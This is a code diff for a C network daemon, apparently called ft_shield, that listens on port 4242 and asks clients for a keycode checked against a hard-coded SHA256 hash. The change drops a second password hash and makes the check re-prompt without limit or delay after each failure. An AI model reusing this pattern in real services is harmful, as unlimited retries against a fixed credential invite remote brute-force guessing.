@@ -15,11 +15,10 @@
 #define PORT 4242
 #define MAX_CLIENTS 3
 #define BUFFER_SIZE 1024
-#define LOCKFILE "/var/run/ft_shield.lock"
+#define LOCKFILE "/var/lock/ft_shield.lock"
 
 // SHA256 hashes of passwords
 #define PASSWORD_HASH "73475cb40a568e8da8a045ced110137e159f890ac4da883b6b17dc651b3a8049"
-#define ALT_PASSWORD_HASH "0315b4020af3eccab7706679580ac87a710d82970733b8719e70af9b57e7b9e6"
 
 // Global variable to track active clients
 static int active_clients = 0;
@@ -52,7 +51,7 @@ int create_lockfile() {
 }
 
 void cleanup_lockfile() {
-    unlink(LOCKFILE);
+    remove(LOCKFILE);
 }
 
 void handle_sigchld(int sig) {
@@ -72,31 +71,34 @@ void handle_sigterm(int sig) {
 int authenticate_client(int client_fd) {
     char buffer[BUFFER_SIZE];
     char *keycode_prompt = "Keycode: ";
-    
-    send(client_fd, keycode_prompt, strlen(keycode_prompt), 0);
-    
-    ssize_t bytes = recv(client_fd, buffer, BUFFER_SIZE - 1, 0);
-    if (bytes <= 0) return 0;
-    
-    buffer[bytes] = '\0';
-    
-    // Remove newline
-    char *newline = strchr(buffer, '\n');
-    if (newline) *newline = '\0';
-    
-    // Hash the input password and compare
-    char* input_hash = hash_password(buffer);
-    if (input_hash == NULL) {
-        return 0;
-    }
-    
-    int auth_success = (strcmp(input_hash, PASSWORD_HASH) == 0 || 
-                       strcmp(input_hash, ALT_PASSWORD_HASH) == 0);
-    free(input_hash);
-    
-    if (!auth_success) {
-        char *error_msg = "Access denied\n";
-        send(client_fd, error_msg, strlen(error_msg), 0);
+    int auth_success = 0;
+
+
+    while (!auth_success) {
+        send(client_fd, keycode_prompt, strlen(keycode_prompt), 0);
+        
+        ssize_t bytes = recv(client_fd, buffer, BUFFER_SIZE - 1, 0);
+        if (bytes <= 0) return 0;
+        
+        buffer[bytes] = '\0';
+        
+        // Remove newline
+        char *newline = strchr(buffer, '\n');
+        if (newline) *newline = '\0';
+        
+        // Hash the input password and compare
+        char* input_hash = hash_password(buffer);
+        if (input_hash == NULL) {
+            return 0;
+        }
+        
+        auth_success = (strcmp(input_hash, PASSWORD_HASH) == 0 );
+        free(input_hash);
+        
+        if (!auth_success) {
+            char *error_msg = "Access denied\n";
+            send(client_fd, error_msg, strlen(error_msg), 0);
+        }
     }
     
     return auth_success;
